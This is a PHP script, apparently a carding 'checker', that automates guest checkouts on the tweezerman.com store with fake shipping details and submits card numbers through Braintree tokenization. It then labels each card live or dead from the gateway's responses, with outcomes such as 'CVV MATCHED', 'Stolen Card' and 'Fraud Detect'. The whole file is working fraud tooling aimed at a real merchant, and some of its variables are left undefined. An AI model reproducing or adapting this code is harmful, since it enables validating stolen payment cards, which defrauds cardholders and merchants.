$curlObj = curl_init(); 
curl_setopt($curlObj,  CURLOPT_URL, 'https://www.tweezerman.com/'); 
curl_setopt($curlObj, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($curlObj,  CURLOPT_RETURNTRANSFER,  1); 
curl_setopt($curlObj,  CURLOPT_HEADER,  1); 
curl_setopt($curlObj,  CURLOPT_SSL_VERIFYPEER,  false); 
$result = curl_exec($curlObj); 
curl_close($curlObj);

preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', 
          $result,  $match_found); 
   
$cookies = array(); 
foreach($match_found[1] as $item) { 
    parse_str($item,  $cookie); 
    $cookies = array_merge($cookies,  $cookie); 
} 
 // var_dump($cookies);
$phpid = $cookies["PHPSESSID"];

$private = $cookies["private_content_version"];


//input type="hidden" name="product" value="1610">
                                        //<input type="hidden" name="uenc" value="aHR0cHM6Ly93d3cudHdlZXplcm1hbi5jb20vY2hlY2tvdXQvY2FydC9hZGQvdWVuYy9hSFIwY0hNNkx5OTNkM2N1ZEhkbFpYcGxjbTFoYmk1amIyMHZjMmh2Y0MxaWVTMXdjbTlrZFdOMEwyZHBablF0YzJWMGN5NW9kRzFzL3Byb2R1Y3QvMTYxMC8,">
                                        //<input name="form_key" type="hidden" value="'.$formkey.'" />
// 1ST REQ PRODUCT GET//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/shop-by-product/gift-sets.html');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$get = curl_exec($ch);

 // FORM KEY
$formkey = trim(strip_tags(getstr($get, 'input name="form_key" type="hidden" value="','" />')));



$bc = trim(strip_tags(getstr($get, '<input type="hidden" name="uenc" value="','">')));


/// POST
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/checkout/cart/add/uenc/'.$bc.'/product/1443/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryBCbaxGRP7oEDSlPK';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; ; form_key='.$formkey.'; ';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/shop-by-product/gift-sets.html';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-gpc: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryBCbaxGRP7oEDSlPK
Content-Disposition: form-data; name="product"

1443
------WebKitFormBoundaryBCbaxGRP7oEDSlPK
Content-Disposition: form-data; name="uenc"

'.$bc.',
------WebKitFormBoundaryBCbaxGRP7oEDSlPK
Content-Disposition: form-data; name="form_key"

'.$formkey.'
------WebKitFormBoundaryBCbaxGRP7oEDSlPK--');
$array = curl_exec($ch);

/// ADDCART
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/customer/section/load/?sections=cart%2Cdirectory-data%2Cammessages%2Csignifyd-fingerprint%2Cmessages&force_new_section_timestamp=true&_=1621854766274');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: application/json, text/javascript, */*; q=0.01';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'referer: https://www.tweezerman.com/shop-by-product/gift-sets.html';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-gpc: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'sections=cart%2Cdirectory-data%2Cammessages%2Csignifyd-fingerprint%2Cmessages&force_new_section_timestamp=true&_=1621854766274');
$addcart = curl_exec($ch);
 if (strpos($addcart, '"is_visible_in_site_visibility":true,"')) {
  $addcartsuccess = 'TRUE';
 // echo 'CART STATUS: '.$addcartsuccess;
 // echo '<br>';/
//echo '<hr>';
 } 

 else {
  $addcartsuccess = 'FAIL';
 // echo 'CART STATUS: '.$addcartsuccess;
//  echo '<br>';
//echo '<hr>';
 }

//{"cart":
// GET CART CHECKOUT PAGE
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/checkout/cart/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'referer: https://www.tweezerman.com/shop-by-product/gift-sets.html';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-gpc: 1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$cart = curl_exec($ch);
// GUEST CART ID
$guestcartid = trim(strip_tags(getstr($cart, '"quoteData":{"entity_id":"','"')));


// CHECKOUT
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'referer: https://www.tweezerman.com/checkout/cart/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'sec-gpc: 1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$checkoutp = curl_exec($ch);

// ENCODED BEARER
$enbearer = trim(strip_tags(getstr($checkoutp, '"clientToken":"','"')));


// DECODED BEARER
$decode = base64_decode($enbearer);

// MAIN BEARER
$bearer = trim(strip_tags(getstr($decode, '"authorizationFingerprint":"','",')));


/// EMAIL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/reclaim/checkout/email');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-newrelic-id: VgcOU19XDhAJU1BaBQMPVQ==';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'');
$email1 = curl_exec($ch);

$entityid = trim(strip_tags(getstr($cart, '"entity_id":"','"')));

//"entity_id":"13507443"

// EMAIL AVAILABLE


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/rest/us_tweezermanm_default/V1/customers/isEmailAvailable');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-newrelic-id: VgcOU19XDhAJU1BaBQMPVQ==';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customerEmail":"'.$email.'"}');
$email = curl_exec($ch);


// ESTIMATE SHIPPING INFORMATION
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/rest/us_tweezermanm_default/V1/guest-carts/'.$guestcartid.'/estimate-shipping-methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-newrelic-id: VgcOU19XDhAJU1BaBQMPVQ==';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"address":{"street":["Street Rio 8790"],"city":"New York","region_id":"43","region":"New York","country_id":"US","postcode":"10080","firstname":"issac","lastname":"Newton","company":"loko","telephone":"8001009000"}}');
$estshippinginfo = curl_exec($ch);



// Total Information
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/rest/us_tweezermanm_default/V1/guest-carts/'.$guestcartid.'/totals-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-newrelic-id: VgcOU19XDhAJU1BaBQMPVQ==';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"address":{"countryId":"US","region":"New York","regionId":"43","postcode":"10080","city":"New York","extension_attributes":{"advanced_conditions":{"payment_method":null,"city":"New York","shipping_address_line":["Street Rio 8790"],"billing_address_country":null,"currency":"USD"}}}}}');
$totalinfo = curl_exec($ch);



/// SShipping Information
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/rest/us_tweezermanm_default/V1/guest-carts/'.$guestcartid.'/shipping-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: _fbp=fb.1.1621856750982.1040111998; form_key='.$formkey.'; mage-banners-cache-storage=%7B%7D; _ga=GA1.2.1360543494.1621856773; _gid=GA1.2.368645482.1621856773; mage-messages=; KL_FORMS_MODAL={%22disabledForms%22:{%22X8zugf%22:{%22lastCloseTime%22:1621856787%2C%22successActionTypes%22:[]}}%2C%22viewedForms%22:{%22X8zugf%22:2831553}}; _pin_unauth=dWlkPU5UTXdOR1kwT1RBdFptVXpZUzAwTldVMUxXSXpNVFF0Tmpsa016aGlaV1l5TVRVMQ; ABTasty=uid=pmvmwm2115hh1hzn&fst=1621856744781&pst=-1&cst=1621856744781&ns=1&pvt=4&pvis=4&th=; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2MjE4NTY3NTEsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnR3ZWV6ZXJtYW4uY29tLyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTYyMTg1Njg2OSwidmFsdWUiOiIiLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cudHdlZXplcm1hbi5jb20vIn0sIiRlbWFpbCI6Imlzc2FjbmtvZXd0b25AZ21haWwuY29tIn0=; private_content_version=28bcdc29f1cdf2964adc9c6f18c34112; _sp_ses.8d31=*; _sp_id.8d31=0076cec13ed08fa4.1621856749.2.1621862278.1621857188; PHPSESSID=66c976e407a8002e80c86c0660ee8244; form_key='.$formkey.'';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-newrelic-id: VgcOU19XDhAJU1BaBQMPVQ==';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["Street Rio 8790"],"company":"loko","telephone":"8001009000","postcode":"10080","city":"New York","firstname":"issac","lastname":"Newton"},"billing_address":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["Street Rio 8790"],"company":"loko","telephone":"8001009000","postcode":"10080","city":"New York","firstname":"issac","lastname":"Newton","saveInAddressBook":null},"shipping_method_code":"matrixrate_417","shipping_carrier_code":"matrixrate","extension_attributes":{"newsletter_subscribe":false}}}');
$shippinginfo = curl_exec($ch);

/// TOKENIZE CC
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$bearer.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d49310d1-9be0-49df-aab5-1372f260472f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$tokeninfo = curl_exec($ch);

// TOKEN
$token = trim(strip_tags(getstr($tokeninfo, '"token":"','"')));



/// FINAL REQ

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.tweezerman.com/rest/us_tweezermanm_default/V1/guest-carts/'.$guestcartid.'/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.tweezerman.com';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/json';
$headers[] = 'cookie: PHPSESSID='.$phpid.'; PHPSESSID='.$phpid.'; form_key='.$formkey.'; form_key='.$formkey.'; private_content_version='.$private.'; ';
$headers[] = 'origin: https://www.tweezerman.com';
$headers[] = 'referer: https://www.tweezerman.com/checkout/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36';
$headers[] = 'x-newrelic-id: VgcOU19XDhAJU1BaBQMPVQ==';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$guestcartid.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["Street Rio 8790"],"company":"loko","telephone":"8001009000","postcode":"10080","city":"New York","firstname":"issac","lastname":"Newton","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$token.'","device_data":"{\"device_session_id\":\"9f855cc86015999f5a6c9b50a79546c6\",\"fraud_merchant_id\":null,\"correlation_id\":\"4f56c8d271ba928cd6fefca7ee9803dc\"}","amgdpr_agreement":"{\"privacy_checkbox\":true}"}},"email":"issacnkoewton@gmail.com"}');

$paymentresponse = curl_exec($ch);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$gdAvs = array("A","B","D","G","P","S","X","Y","Z");

if(($cvvres == "M") && ((in_array($avsres, $gdAvs)) === true)){
$chStatus = "Yes";
}else{
$chStatus = "No";
};

if(strlen($year) == 2){
$year = '20'.$year;
};

$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
curl_close($ch);

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

if(strpos($paymentresponse, 'Gateway Rejected: avs')){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, "Insufficient Funds")){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCH [Insuf. Balance] ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, "Card Issuer Declined CVV")){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CCN MATCHED ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Stolen Card')){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CCN MATCH [Stolen Card] ★ 』 </span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Lost Card')){
    echo '<span class="badge badge-white">Aprovadas </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CCN MATCH [Lost Card] ★ 』 </span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Processor Declined' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Processor Declined ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Declined' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Card Declined ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Do Not Honor' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Do Not Honor ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Pickup Card' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Pickup Card 「Reported Stolen Or Lost」 ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Transaction Not Allowed' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Transaction Not Allowed ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Issuer or Cardholder has put a restriction on the card' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Issuer or Cardholder has put a restriction on the card ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'risk_threshold' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Fraud Detect ★ 』 </span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(strpos($paymentresponse, 'Gateway Rejected: fraud' )) {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Fraud Detect ★ 』 </span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
elseif(!$paymentresponse){
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Proxy Dead ★ 』 </span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}
else {
    echo '<span class="badge badge-warning">Reprovadas</span></br> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-danger"> 『 ★ Error Not listed ★ 』</span> </b></br> <span class="badge badge-white">『 Lucas <3 』</span></br>';
}

curl_close($ch);
}


